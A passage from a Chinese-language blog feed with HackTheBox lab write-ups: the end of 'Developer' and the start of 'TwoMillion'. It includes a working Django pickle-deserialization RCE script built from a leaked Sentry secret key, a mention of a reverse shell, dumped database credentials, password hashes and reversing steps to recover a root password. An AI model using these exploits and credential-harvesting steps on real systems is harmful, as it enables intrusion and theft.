10.10.11.103 - - [21/Jun/2025 20:49:25] "POST /accounts/login/ HTTP/1.1" 302 -
10.10.11.103 - - [21/Jun/2025 20:49:28] "GET /accounts/login/ HTTP/1.1" 200 -
```

è¿™é‡Œå¾ˆå¥‡æ€ªçš„å°±æ˜¯ï¼Œæˆ‘è‡ªå·±å¤ç°è¯¥æ¼æ´æ— æ³•å¤ç°æˆåŠŸ

## Django Secret Key & RCE

æ‹¥æœ‰ç®¡ç†å‘˜å‡­æ®åï¼Œæˆ‘ä»¬å°±èƒ½å¯¹ `/admin`è¿›è¡Œç™»é™†äº†

![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image16.png)

èƒ½å‘ç°ä¸€ä¸ªæ–°çš„å­åŸŸå

![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image17.png)

æ­å»ºçš„æ˜¯`sentry` ä¸€æ¬¾å¼€æºçš„å®æ—¶å¼‚å¸¸ç›‘æ§å¹³å°

![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image18.png)

æ³¨å†Œè´¦å·ç™»å½•è¿›å»ï¼Œæ— æ³•ä½¿ç”¨ä¸Šé¢çš„å‡­æ®

![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image19.png)

ç‰ˆæœ¬ `Sentry 8.0.0` åœ¨ç½‘ä¸Šèƒ½æ‰¾åˆ°å®ƒçš„ååºåˆ—åŒ–æ¼æ´çš„åˆ©ç”¨è„šæœ¬ï¼Œä½†æ˜¯å¹¶æ²¡æœ‰å°†`shell`å¼¹å›æ¥

![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image20.png)

è¿™é‡Œä½¿ç”¨ `jacob@developer.htb` ï¼ˆå¯ä»¥ä»`Member`é‡Œå¾—åˆ°ï¼‰çš„å‡­æ®å’Œä¸Šè¾¹é’“é±¼å¾—åˆ°çš„å¯†ç æˆåŠŸè·å¾—`sentry`æ›´é«˜æƒé™

![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image21.png)

ç„¶åæ‘¸ç´¢ä¸€ç•ªåï¼Œæˆ‘åˆ›å»ºäº†æ–°çš„`project`ç„¶ååˆ é™¤ï¼Œä½†æ˜¯åˆ é™¤çš„æ—¶å€™å‡ºç°äº†é”™è¯¯

![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image22.png)

è¿˜æœ‰å¾ˆå¤šçš„è°ƒè¯•ä¿¡æ¯

```bash
SENTRY_OPTIONS 	

{'cache.backend': 'sentry.cache.redis.RedisCache',
 'cache.options': {},
 'redis.options': {'hosts': {0: {'host': '127.0.0.1',
                                 'password': 'g7dRAO6BjTXMtP3iXGJjrSkz2H9Zhm0CAp2BnXE8h92AOWsPZ2zvtAapzrP8sqPR92aWN9DA207XmUTe',
                                 'port': 6379}}},
 'system.databases': {'default': {'ATOMIC_REQUESTS': False,
                                  'AUTOCOMMIT': True,
                                  'CONN_MAX_AGE': 0,
                                  'ENGINE': 'sentry.db.postgres',
                                  'HOST': 'localhost',
                                  'NAME': 'sentry',
                                  'OPTIONS': {},
                                  'PASSWORD': u'********************',
                                  'PORT': '',
                                  'TEST_CHARSET': None,
                                  'TEST_COLLATION': None,
                                  'TEST_MIRROR': None,
                                  'TEST_NAME': None,
                                  'TIME_ZONE': 'UTC',
                                  'USER': 'sentry'}},
 'system.debug': True,
 'system.secret-key': 'c7f3a64aa184b7cbb1a7cbe9cd544913'}
```

å¯ä»¥çœ‹åˆ°å†…éƒ¨è£…äº†`redis` ï¼Œå¹¶ä¸”å¯†ç ä¹Ÿå‡ºæ¥äº†ï¼Œä¸‹è¾¹è¿˜æœ‰ä¸ªæœ‰è¶£çš„`secret-key`

ç»è¿‡ä¸€ç•ªæœç´¢ï¼Œ`secret-key` ä¼šå¯¼è‡´ååºåˆ—åŒ–çš„`RCE`æ¼æ´

å…¶ä¸­æœ‰ä¸€ç¯‡æ–‡ç« ï¼šhttps://blog.scrt.ch/2018/08/24/remote-code-execution-on-a-facebook-server/

é‡Œè¾¹æœ‰ä¸€ä¸ª`POC` ï¼Œä¼šè®©ç³»ç»Ÿç¡`30`ç§’

```bash
#!/usr/bin/python
import django.core.signing, django.contrib.sessions.serializers
from django.http import HttpResponse
import cPickle
import os

SECRET_KEY='c7f3a64aa184b7cbb1a7cbe9cd544913'
#Initial cookie I had on sentry when trying to reset a password
cookie='.eJxrYKotZNQI5UxMLsksS80vSi9kimBjYGAoTs0rKaosZA5lKS5NyY_gAQplR7lVRJYEmrkUFqZFcAEFSlKLS5Lz87MzU8FayvOLslNTQnnjE0tLMuJLi1OL4jNTvFlDhZAEkhKTs1PzUkKVIObrlZZk5hTrgeT1XHMTM3McgSwniJpSPQABCTQf:1uSyim:otT7eddw7eu0o_QNAt1QRz6f1m8'
newContent =  django.core.signing.loads(cookie,key=SECRET_KEY,serializer=django.contrib.sessions.serializers.PickleSerializer,salt='django.contrib.sessions.backends.signed_cookies')
class PickleRce(object):
    def __reduce__(self):
        return (os.system,("sleep 30",))
newContent['testcookie'] = PickleRce()

print django.core.signing.dumps(newContent,key=SECRET_KEY,serializer=django.contrib.sessions.serializers.PickleSerializer,salt='django.contrib.sessions.backends.signed_cookies',compress=True)
```

```bash
âœ  Developer python2 POC.py     
.eJxrYKotZNQI5UxMLsksS80vSo9gY2BgKE7NKymqDGUpLk3Jj-ABCmRHuVVElgSauRQWpkVwAQVKUotLkvPzszNTkwvyizMruIori0tSc7kKmUI5inNSUwsUjA0KmVsLWYIKWUOF4hNLSzLiS4tTi-KTEpOzU_NSQpUgduiVlmTmFOuB5PVccxMzcxyBLCeoGl4kfZkp3qylegB0jjs_:1uT0GX:UtsjlwEnnkwtUuqifJt-ZzyYO1s
```

äº‹å®è¯æ˜ï¼Œæ›¿æ¢äº†`Cookie`åï¼Œç¡®å®åŠ è½½äº†`30`ç§’

![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image23.png)

æˆ‘ä»¬å°è¯•è®©å…¶`curl`æˆ‘ä»¬çš„æœåŠ¡å™¨

![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image24.png)

è¿›è¡Œåå¼¹`Shell` 

![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image25.png)

## In www-data Shell

ä¿¡æ¯æ”¶é›†ä¸€æ³¢

æœ‰ä¸¤ä¸ªç”¨æˆ·

```bash
www-data@developer:/var/sentry$ ls /home
ls /home
karl
mark
```

æ•°æ®é…ç½®æ–‡ä»¶å¯ä»¥åœ¨`/var/www/developer_ctf/developer_ctf/settings.py` ä¸­æ‰¾åˆ°

```bash
DATABASES = {                                            
    'default': {           
        'ENGINE': 'django.db.backends.postgresql',       
        'NAME': 'platform',             
        'USER': 'ctf_admin',  
        'PASSWORD': 'CTFOG2021',                         
        'HOST': 'localhost',   
        'PORT': '',    
    }                                      
}  
```

```bash
www-data@developer:~/developer_ctf$ psql -U ctf_admin -h localhost -p 5432 -d platform
Password for user ctf_admin: 
psql (9.6.22)
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
Type "help" for help.

platform=> 
```

è·å¾—ç”¨æˆ·ä¼¼ä¹éƒ½æ— æ•ˆ

```bash
 id |                                         password                                         |          last_login           | is_superuser |                                                                        username                                                                        | first_name | last_name |          email           | is_staff | is_active |          date_joined          
----+------------------------------------------------------------------------------------------+-------------------------------+--------------+--------------------------------------------------------------------------------------------------------------------------------------------------------+------------+-----------+--------------------------+----------+-----------+-------------------------------
  5 | pbkdf2_sha256$260000$FyKNWfAl4Z87o55I4bDST7$7PrVwU5N1687BSxClTP0tlnFg+9VmOR6lsXiJsSRBNE= | 2021-05-27 20:15:00.346686+00 | f            | clubby789                                                                                                                                              |            |           | clubby789@developer.htb  | f        | t         | 2021-05-27 20:15:00.157993+00
  2 | pbkdf2_sha256$260000$7Pu55SdoDNTu51RrtU5V8A$Fmn66ovbOqfNUKftQYrJcWmk7xzejU0g3F72jL+cdUg= | 2021-05-23 22:25:03.654845+00 | f            | willwam845                                                                                                                                             |            |           | willwam845@developer.htb | f        | t         | 2021-05-23 22:25:03.474364+00
  3 | pbkdf2_sha256$260000$k0RbpkHl5CvArYIwsGxFUb$ixe4YKYn45Fm8aq56GEzF8TUi9lydD2WA2gRxXz/EMc= | 2021-05-25 12:23:52.298531+00 | f            | dmw0ng                                                                                                                                                 |            |           | dmw0ng@developer.htb     | f        | t         | 2021-05-25 12:23:52.090526+00
  4 | pbkdf2_sha256$260000$aFEnXsRKf4YRRUw1qnlJSN$4oL+FVJpqmi4sCt4U9ddPRE1srKZiP+HCXInnCuzdv0= | 2021-05-25 13:52:30.406816+00 | f            | jazzpizazz                                                                                                                                             |            |           | jazzpizazz@developer.htb | f        | t         | 2021-05-25 13:52:30.239297+00
  8 | pbkdf2_sha256$260000$1ooBpoiFmfVEwYt6dsoXMi$fODy4UKt0vv0BllqLAJmSinmGBFffbezZrLptuyGpe4= | 2025-06-21 11:35:29.667268+00 | f            | sunset                                                                                                                                                 |            |           | sunset@qq.com            | f        | t         | 2025-06-21 04:44:05.184883+00
  9 | pbkdf2_sha256$260000$7fttI4Tuwlrd2wlnkScbDs$t9DwUfhd6jv8yiD7uih4HMgsKjrUg/uCVR3RdujzBic= |                               | f            | 111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111 |            |           |                          | f        | t         | 2025-06-21 13:07:47.706432+00
 10 | pbkdf2_sha256$260000$2tCPe0purzYSIKkdmorGpl$a4bFd9XH8FUfnZl+mx/uAV3E1VxcjFJUOy8UAlbxL9Y= |                               | f            | 222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222 |            |           |                          | f        | t         | 2025-06-21 13:08:43.403158+00
  1 | pbkdf2_sha256$260000$H7w2AZzBGAHHHvSzgQZXHf$TWkQdxmDHXDxoWLSEQYjZQbMJJjMpzmEHBqWMNHr0xc= | 2025-06-21 13:16:19.266228+00 | t            | admin                                                                                                                                                  | Jacob      | Taylor    | admin@developer.ctf      | t        | t         | 2021-05-22 23:14:03+00
```

ç„¶ååœ¨`/etc/sentry/sentry.conf.py` åˆèƒ½æ‰¾åˆ°ä¸€ä¸ªæ•°æ®åº“å‡­æ®

```bash
    'default': {
        'ENGINE': 'sentry.db.postgres',
        'NAME': 'sentry',                           
        'USER': 'sentry',
        'PASSWORD': 'SentryPassword2021',
        'HOST': 'localhost',
        'PORT': '',
    }     
}
```

è¿™æ¬¡èƒ½è·å¾—ä¸‰ä¸ªç”¨æˆ·ï¼Œå¹¶ä¸”`karl`æ˜¯æœ‰å®¶ç›®å½•çš„

```bash
sentry=#   
select id,username,password from auth_user;
 id |      username       |                                   password                                    
----+---------------------+-------------------------------------------------------------------------------
  1 | karl@developer.htb  | pbkdf2_sha256$12000$wP0L4ePlxSjD$TTeyAB7uJ9uQprnr+mgRb8ZL8othIs32aGmqahx1rGI=
  6 | sunset@qq.com       | pbkdf2_sha256$12000$0EZfh8zCtpXY$8aNutC5bwrU65AtpuvspwEicUw2+63EQ61zjTyzVViE=
  5 | jacob@developer.htb | pbkdf2_sha256$12000$MqrMlEjmKEQD$MeYgWqZffc6tBixWGwXX2NTf/0jIG42ofI+W3vcUKts=
(3 rows)
```

å°è¯•ç ´è§£å¯†ç 

![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image26.png)

å¾—åˆ°å¯†ç ï¼š`insaneclownposse`

æˆåŠŸè¿›å…¥`Karl`ç”¨æˆ·`Shell`ä¸­ï¼Œè¯»å–`user.txt`

```bash
karl@developer:~$ cat user.txt
77cc1a399155edc9a66dae47df32a834
```

## In Karl Shell - To Root

`sudo`æƒé™

```bash
karl@developer:~$ sudo -l
[sudo] password for karl: 
Matching Defaults entries for karl on developer:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User karl may run the following commands on developer:
    (ALL : ALL) /root/.auth/authenticator
```

æ‹‰å‡ºæ¥`IDA` ï¼Œ`rust` é€†å‘`+1`

![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image27.png)

`main`ä¸­è¿˜æœ‰ä¸ª`authentication::main` 

```bash
int __fastcall main(int argc, const char **argv, const char **envp)
{
  isize v4; // rdx
  core::ops::function::_Fn<()> v5; // rdi
  __int64 (__fastcall *v7)(); // [rsp+0h] [rbp-8h] BYREF

  v4 = argc;
  v7 = authentication::main::h453271f02403abaf;
  v5.vtable = (usize (*)[3])&anon_b091e66417960b0266d335ff382118b4_0_llvm_10046553308101135558;
  v5.pointer = (u8 *)&v7;
  return std::rt::lang_start_internal::h3c710f42dc1fbba8(v5, v4, (u8 **)argv);
}
```

è¿›å…¥åˆ°`authentication::main` ï¼Œå‰è¾¹ä¸¤ä¸ª`print`æ˜¯æ‰“å°å‰ä¸¤æ¡ä¿¡æ¯

![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image28.png)

![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image29.png)

å†ä¸‹é¢å°±æ˜¯åŠ å¯†çš„å‡½æ•°

![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image30.png)

`args.pieces.data_ptr = (_str *)crypto::aes::ctr::h2e946f13694abc7d(0LL, &v36, 16LL, &v37, 16LL);`

å‘Šè¯‰æˆ‘ä»¬ä½¿ç”¨`AES-CTR`è¿›è¡ŒåŠ å¯†ï¼Œå¹¶ä¸”ä¼ å…¥äº†ä»å†…å­˜åœ°å€å†²ä¼ å…¥çš„ä¸¤ä¸ªå¸¸é‡`v36`å’Œ`v37` ï¼Œå¾ˆæœ‰å¯èƒ½æ˜¯`key`å’Œ`VI`

æˆ‘ä»¬ä»`v36` å’Œ `v37`ä¸­å°†å€¼å¤åˆ¶å‡ºæ¥

![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image31.png)

è¿˜å› ä¸ºæ˜¯å°ç«¯æ˜¾ç¤ºçš„é—®é¢˜ï¼Œæˆ‘ä»¬è¿˜è¦å¯¹å…¶è½¬æ¢ä¸€ä¸‹

```bash
D5F5F4BE3DD4209E6191795C3432E8A3
6A812006DC5598A79A95D2D9E3591F76
//
A3E832345C7991619E20D43DBEF4F5D5
761F59E3D9D2959AA79855DC0620816A
```

![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image32.png)

æˆ‘ä»¬å°†åŠ å¯†å’Œè§£å¯†å‡½æ•°å‡†å¤‡å¥½

å†åˆ°ä¸‹è¾¹ï¼ˆä»£ç å–‚ç»™`AI`ï¼‰ï¼Œé¦–å…ˆä¼šåˆ¤æ–­æ˜æ–‡é•¿åº¦æ˜¯å¦ç­‰äº`32`

```bash
if ( size[1] == 32
    && (ptr == (u8 *)v5
     || _mm_movemask_epi8(
          _mm_and_si128(
            _mm_cmpeq_epi8(_mm_loadu_si128((const __m128i *)ptr + 1), _mm_loadu_si128(v5 + 1)),
            _mm_cmpeq_epi8(_mm_loadu_si128((const __m128i *)ptr), _mm_loadu_si128(v5)))) == 0xFFFF) )
  {
```

![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image33.png)

`ptr`Â (æˆ‘ä»¬çš„è§£å¯†ç»“æœ) çš„åœ°å€è¢«åŠ è½½åˆ°äº†Â `RAX`Â å¯„å­˜å™¨ã€‚`v5`Â (ç¨‹åºå†…ç½®çš„ç›®æ ‡æ˜æ–‡) çš„åœ°å€è¢«åŠ è½½åˆ°äº†Â `R15`Â å¯„å­˜å™¨ã€‚

é€šè¿‡è°ƒè¯•ç¡®è®¤ä¸€ä¸‹

```bash
pwndbg> b main
pwndbg> r
pwndbg> b *0x55555555b9b9
Breakpoint 2 at 0x55555555b9b9
pwndbg> c
Continuing.
Welcome to TheCyberGeek's super secure login portal!
Enter your password to access the super user:
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA //å› ä¸ºæœŸå¾…è§£å¯†åæ˜æ–‡é•¿åº¦æ˜¯32å› æ­¤è¾“å…¥32ä¸ªA
pwndbg> hexdump $rax 32 //è·å–RAXçš„å€¼
+0000 0x5555555b7dd0  ed 2f 17 c5 87 44 a4 d8  5c a2 c9 6b d4 69 18 22  â”‚./...D..â”‚\..k.i."â”‚
+0010 0x5555555b7de0  69 86 ec f4 c8 2c 84 de  d8 c1 dc 4b ec 57 6e 44  â”‚i....,..â”‚...K.WnDâ”‚
```

```bash
âœ  Developer awk '{for(i=3;i<=18;i++) printf $i}' rax
ed2f17c58744a4d85ca2c96bd46918226986ecf4c82c84ded8c1dc4bec576e44#    
```

![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image34.png)

è§£å¯†æˆåŠŸï¼Œé‚£ä¹ˆ`R15`çš„å€¼åº”è¯¥å°±æ˜¯æˆ‘ä»¬éœ€è¦çš„

```bash
pwndbg> hexdump $r15 32
+0000 0x5555555b7c20  fe 1b 25 f0 80 6a 97 ca  78 80 fd 58 fc 5c 20 23  â”‚..%..j..â”‚x..X.\.#â”‚
+0010 0x5555555b7c30  6c a2 db d0 e5 02 b5 fa  eb c0 af 3a 9f 27 15 2c  â”‚l.......â”‚...:.'.,â”‚
```

```bash
âœ  Developer awk '{for(i=3;i<=18;i++) printf $i}' r15
fe1b25f0806a97ca7880fd58fc5c20236ca2dbd0e502b5faebc0af3a9f27152c#   
```

![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image35.png)

å¾—åˆ°é‡ç‚¹`RustForSecurity@Developer@2021:)`

æˆ‘ä»¬åˆ°`karl`çš„`shell`ä¸­è¿è¡Œç¨‹åºï¼Œä¼šè®©æˆ‘ä»¬è¾“å…¥æˆ‘ä»¬çš„å…¬é’¥

```bash
karl@developer:~$ sudo /root/.auth/authenticator 
[sudo] password for karl: 
Welcome to TheCyberGeek's super secure login portal!
Enter your password to access the super user: 
RustForSecurity@Developer@2021:)
You have successfully authenticated
Enter your SSH public key in now:
ssh-xxxxx AAAAC3NzxxxxxxxJqSEDwP6SCfe root@kali
You may now authenticate as root!
```

ç„¶åé€šè¿‡æˆ‘ä»¬çš„ç§é’¥å°±å¯ä»¥ç™»å½•åˆ°`root`

![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image36.png)

è¯»å– `root.txt`

```bash
root@developer:~# cat root.txt 
720b2e4080688fxxxxx
```

## æ€»ç»“

å¾ˆå¤šçš„çŸ¥è¯†ç›²åŒºï¼Œæˆ–è€…è¯´æ˜¯æˆ‘æ²¡è€å¿ƒï¼Œå¾ˆå¤šåœ°æ–¹éƒ½è¦çœ‹ä¸€ä¸‹WPæ‰èƒ½çŸ¥é“å¦‚ä½•èµ°ä¸‹å»

æ€»çš„æ¥è¯´éš¾åº¦ä¸ªäººè€Œè¨€ `8/10` ï¼Œæ³ª]]></content:encoded>
            <category>é¶æœº</category>
            <category>HackTheBox</category>
            <category>Linux</category>
            <category>CTF</category>
            <category>Rrverse</category>
            <category>Rust</category>
            <category>Django</category>
            <category>Tabanbbing</category>
            <category>Crack</category>
        </item>
        <item>
            <title><![CDATA[HackTheBox - Machine - TwoMillion]]></title>
            <link>https://www.sunsetaction.top/2025/06/21/HackTheBoxMachine - TwoMillion</link>
            <guid isPermaLink="false">https://www.sunsetaction.top/2025/06/21/HackTheBoxMachine - TwoMillion</guid>
            <pubDate>Sat, 21 Jun 2025 00:00:00 GMT</pubDate>
            <description><![CDATA[Machine TwoMillion https://app.hackthebox.com/machines/TwoMillion | Linux | Eas Recon è®¿é—® HTTP æœåŠ¡ï¼Œé‡‡é›†æŒ‡çº¹ï¼Œæ˜¯ä»‹ç» HackTheBox ç½‘ç«™ æœ‰ä¸€ä¸ªç™»å½•é¡µ æ³¨å†Œéœ€è¦æ‹¿åˆ°é‚€è¯·ç  é€šè¿‡ç›®å½•æ‰«æèƒ½æ‰«æåˆ°å¦å¤–ä¸€...]]></description>
            <content:encoded><![CDATA[
# Machine - TwoMillion

> https://app.hackthebox.com/machines/TwoMillion | `Linux`Â |Â `Eas`
> 

![image.png](/post-images/HackTheBoxMachine%20-%20TwoMillion/image.png)

## Recon

```bash
âœ  TwoMillion nmap -sT -min-rate 5000 10.10.11.221  
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-20 20:22 CST
Nmap scan report for 10.10.11.221
Host is up (0.072s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 0.94 seconds
```

```bash
âœ  TwoMillion nmap -sT -A -p 22,80 10.10.11.221   
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-20 20:23 CST
Nmap scan report for 10.10.11.221
Host is up (0.085s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx
|_http-title: Did not follow redirect to http://2million.htb/
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using proto 1/icmp)
HOP RTT       ADDRESS
1   117.43 ms 10.10.16.1
2   71.72 ms  10.10.11.221

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.44 seconds
âœ  TwoMillion ls                                  
```

è®¿é—® `HTTP` æœåŠ¡ï¼Œé‡‡é›†æŒ‡çº¹ï¼Œæ˜¯ä»‹ç» `HackTheBox` ç½‘ç«™

![image.png](/post-images/HackTheBoxMachine%20-%20TwoMillion/image1.png)

æœ‰ä¸€ä¸ªç™»å½•é¡µ

![image.png](/post-images/HackTheBoxMachine%20-%20TwoMillion/image2.png)

æ³¨å†Œéœ€è¦æ‹¿åˆ°é‚€è¯·ç 

![image.png](/post-images/HackTheBoxMachine%20-%20TwoMillion/image3.png)

é€šè¿‡ç›®å½•æ‰«æèƒ½æ‰«æåˆ°å¦å¤–ä¸€ä¸ªæ³¨å†Œé¡µé¢ï¼Œä¾æ—§æ˜¯éœ€è¦`Invite Code`

```bash
âœ  TwoMillion dirsearch -u http://2million.htb -e txt,zip -x 403,404,503 
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: txt, zip | HTTP method: GET | Threads: 25 | Wordlist size: 9979

Output File: /root/Desktop/HackTheBox/TwoMillion/reports/http_2million.htb/_25-06-20_20-53-44.txt

Target: http://2million.htb/

[20:53:44] Starting: 
[20:53:53] 200 -    2KB - /404
[20:54:04] 401 -    0B  - /api
[20:54:04] 401 -    0B  - /api/v1
[20:54:05] 301 -  162B  - /assets  ->  http://2million.htb/assets/
[20:54:12] 301 -  162B  - /css  ->  http://2million.htb/css/
[20:54:18] 301 -  162B  - /fonts  ->  http://2million.htb/fonts/
[20:54:20] 302 -    0B  - /home  ->  /
[20:54:21] 301 -  162B  - /images  ->  http://2million.htb/images/
[20:54:23] 301 -  162B  - /js  ->  http://2million.htb/js/
[20:54:25] 200 -    4KB - /login
[20:54:26] 302 -    0B  - /logout  ->  /
[20:54:38] 200 -    4KB - /register
[20:54:52] 301 -  162B  - /views  ->  http://2million.htb/views/

Task Completed
```

![image.png](/post-images/HackTheBoxMachine%20-%20TwoMillion/image4.png)

## GetInviteCode

æˆ‘ä»¬ä»”ç»†è§‚å¯Ÿ`invite`é¡µé¢ï¼Œä¼šåŠ è½½ä¸€ä¸ªJSæ–‡ä»¶`inviteapi.min.js` ï¼Œæ˜¯ä¸€ä¸ª`Packer`ä¸€ç§`JavaScript`ä»£ç æ··æ·†å™¨

```bash
eval(
  (function (p, a, c, k, e, d) {
    e = function (c) {
      return c.toString(36);
    };
    if (!''.replace(/^/, String)) {
      while (c--) {
        d[c.toString(a)] = k[c] || c.toString(a);
      }
      k = [
        function (e) {
          return d[e];
        },
      ];
      e = function () {
        return '\\w+';
      };
      c = 1;
    }
    while (c--) {
      if (k[c]) {
        p = p.replace(new RegExp('\\b' + e(c) + '\\b', 'g'), k[c]);
      }
    }
    return p;
  })(
    '1 i(4){h 8={"4":4};$.9({a:"7",5:"6",g:8,b:\'/d/e/n\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}1 j(){$.9({a:"7",5:"6",b:\'/d/e/k/l/m\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}',
    24,
    24,
    'response|function|log|console|code|dataType|json|POST|formData|ajax|type|url|success|api/v1|invite|error|data|var|verifyInviteCode|makeInviteCode|how|to|generate|verify'.split(
      '|',
    ),
    0,
    {},
  ),
);

```

æˆ‘ä»¬ä½¿ç”¨`AI`å°†å…¶è¿˜åŸå¾—åˆ°

```bash
function verifyInviteCode(code) {
  var formData = { "code": code };
  $.ajax({
    type: "POST",
    dataType: "json",
    data: formData,
    url: '/api/v1/invite/verify',
    success: function(response) {
      console.log(response);
    },
    error: function(response) {
      console.log(response);
    }
  });
}

function makeInviteCode() {
  $.ajax({
    type: "POST",
    dataType: "json",
    url: '/api/v1/invite/how/to/generate',
    success: function(response) {
      console.log(response);
    },
    error: function(response) {
      console.log(response);
    }
  });
}
```

å…¶ä¸­çš„`/api/v1/invite/how/to/generate`å¾ˆä»¤äººæ„Ÿå…´è¶£

```bash
âœ  TwoMillion curl http://2million.htb/api/v1/invite/how/to/generate -X POST
{"0":200,"success":1,"data":{"data":"Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb \/ncv\/i1\/vaivgr\/trarengr","enctype":"ROT13"},"hint":"Data is encrypted ... We should probbably check the encryption type in order to decrypt it..."}#
```

> Data is encrypted ... We should probbably check the encryption type in order to decrypt it...
> 

ä»`dada`èƒ½çœ‹åˆ°ï¼ŒåŠ å¯†ç±»å‹æ˜¯`ROT13`

```bash
"data":{
	"data":"Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb \/ncv\/i1\/vaivgr\/trarengr",
	"enctype":"ROT13"
}
```

é€šè¿‡`CyberChef`å³å¯è§£å¯†

![image.png](/post-images/HackTheBoxMachine%20-%20TwoMillion/image5.png)

```bash
In order to generate the invite code, make a POST request to \/api\/v1\/invite\/generate
```

è®©æˆ‘ä»¬å‘`/api/v1/invite/generate` å‘èµ·`POST`è¯·æ±‚

```bash
âœ  TwoMillion curl http://2million.htb/api/v1/invite/generate  -X POST     
{"0":200,"success":1,"data":{"code":"NjlKS04tMkVHSTQtM1NIN0YtUjNLRFk=","format":"encoded"}}#  
```

å¯ä»¥çœ‹åˆ°è¿˜æ˜¯åŠ å¯†çš„ï¼Œä½†æ˜¯è¿™æ¬¡çš„åŠ å¯†å°±æ˜¯ç®€å•çš„`base64`ç¼–ç 

![image.png](/post-images/HackTheBoxMachine%20-%20TwoMillion/image6.png)

å¾—åˆ°é‚€è¯·ç  `69JKN-2EGI4-3SH7F-R3KDY`

æˆ‘ä»¬é€šè¿‡é‚€è¯·ç æ³¨å†Œç”¨æˆ· `sunset`

## åå°åˆ©ç”¨

æˆ‘ä»¬ä»`Rules`ä¸­èƒ½çŸ¥é“æ˜¯å¯ä»¥æ”»å‡»å…¶ä»–æˆå‘˜çš„

![image.png](/post-images/HackTheBoxMachine%20-%20TwoMillion/image7.png)

å¹¶ä¸”åœ¨ `http://2million.htb/home/access#` ä¸­èƒ½ç”Ÿæˆ`opvn`æ–‡ä»¶ï¼ˆç»è¿‡å®éªŒæ˜¯æ— æ³•è¿›è¡Œè¿æ¥çš„ï¼‰ï¼Œç«¯ç‚¹æ˜¯**`/**api/v1/user/vpn/generate`

![image.png](/post-images/HackTheBoxMachine%20-%20TwoMillion/image8.png)

æˆ‘ä»¬å¯ä»¥æ³¨æ„åˆ°ç«¯ç‚¹æ˜¯**`/**api/v1/user` é‚£ä¹ˆå¯èƒ½ä¼šæœ‰**`/**api/v1/admin`

è¿™é‡Œæˆ‘ä½¿ç”¨`feroxbuster` æµ‹è¯•äº†å¾ˆä¹…ï¼Œä½†æ˜¯è¿˜æ˜¯æ²¡æœ‰`fuzz`å‡ºæ¥

ä½†æ˜¯è¿™é‡Œå…¶å®åªéœ€è¦è®¿é—® `/api/v1`å°±å¯ä»¥å¾—åˆ°æ¥å£è·¯å¾„ä¿¡æ¯â€¦

![image.png](/post-images/HackTheBoxMachine%20-%20TwoMillion/image9.png)

```bash
{
  "v1": {
    "user": {
      "GET": {
        "/api/v1": "Route List",
        "/api/v1/invite/how/to/generate": "Instructions on invite code generation",
        "/api/v1/invite/generate": "Generate invite code",
        "/api/v1/invite/verify": "Verify invite code",
        "/api/v1/user/auth": "Check if user is authenticated",
        "/api/v1/user/vpn/generate": "Generate a new VPN configuration",
        "/api/v1/user/vpn/regenerate": "Regenerate VPN configuration",
        "/api/v1/user/vpn/download": "Download OVPN file"
      },
      "POST": {
        "/api/v1/user/register": "Register a new user",
        "/api/v1/user/login": "Login with existing user"
      }
    },
    "admin": {
      "GET": {
        "/api/v1/admin/auth": "Check if user is admin"
      },
      "POST": {
        "/api/v1/admin/vpn/generate": "Generate VPN for specific user"
      },
      "PUT": {
        "/api/v1/admin/settings/update": "Update user settings"
      }
    }
  }
}
```

### æ¥å£æµ‹è¯•

ä¸‰ä¸ªç®¡ç†å‘˜æ¥å£ä¸­ï¼Œæˆ‘ä»¬å¯¹`/api/v1/admin/settings/update` æœ€æ„Ÿå…´è¶£

